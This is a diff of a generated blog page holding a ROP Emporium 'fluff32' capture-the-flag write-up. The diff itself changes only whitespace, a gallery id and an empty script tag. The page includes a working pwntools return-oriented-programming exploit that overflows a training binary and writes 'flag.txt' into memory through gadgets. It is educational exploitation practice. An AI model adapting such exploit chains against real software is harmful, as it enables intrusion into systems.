@@ -64,6 +64,11 @@
 
 <meta name="generator" content="Hexo 7.1.1"></head>
 
+<script>
+
+
+
+</script>
 <body>
   
   
@@ -274,8 +279,10 @@
   </div>
 
     
-  </div>
+  </div> 
 </sidebar>
+
+
     </div>
     <div id="content-body">
        
@@ -287,7 +294,7 @@
 <div class="article-gallery">
   <div class="article-gallery-photos">
     
-      <a class="article-gallery-img" rel="gallery_cm95uvrbn00063gkyb33ng9m2">
+      <a class="article-gallery-img" rel="gallery_cmatosr1c0004cskyhdxt0vaa">
         <img src="/wpimages/2024/ctf/pwn/ropemporium-6.jpg" itemprop="image">
       </a>
     
@@ -350,7 +357,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(terminal=[&#x27;tmux&#x27;,&#x27;new-window&#x27;])</span><br><span class="line">p=gdb.debug(&#x27;./fluff32&#x27;,&quot;b pwnme&quot;)</span><br><span class="line">context.bits=32</span><br><span class="line"></span><br><span class="line">c=b&#x27;A&#x27;*44</span><br><span class="line"></span><br><span class="line">data=0x0804a018</span><br><span class="line">bss=0x0804a020</span><br><span class="line"></span><br><span class="line">flag=[p32(0xb4b), p32(0x2dd), p32(0x1d46), p32(0xb5a), p32(0xdb), p32(0xacd), p32(0x1ac5), p32(0xacd)]</span><br><span class="line"></span><br><span class="line">pop_ebp=0x080485bb</span><br><span class="line">pext_edx=0x08048543</span><br><span class="line"></span><br><span class="line">pop_ecx_bswap_ecx=0x08048558</span><br><span class="line">xchg_bytecx_dl=0x08048555</span><br><span class="line"></span><br><span class="line">ret=p32(0x08048382)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print_file=0x080483d0</span><br><span class="line"></span><br><span class="line">payload=c</span><br><span class="line"></span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    payload+=p32(pop_ebp)+flag[i]</span><br><span class="line">    payload+=p32(pext_edx)</span><br><span class="line">    payload+=p32(pop_ecx_bswap_ecx)+pack(bss+i,endian=&quot;big&quot;)</span><br><span class="line">    payload+=p32(xchg_bytecx_dl)</span><br><span class="line"></span><br><span class="line">payload+=p32(print_file)+p32(0x0)+p32(bss)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
         
       </div>
-
+      
          
     </div>
     
@@ -405,6 +412,7 @@
   </div>
 </footer>
 
+
     </div>
     <div class="back-to-top-wrapper">
     <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
@@ -433,3 +441,5 @@
   <script src="/js/light-dark-switch.js"></script>
 </body>
 </html>
+
+
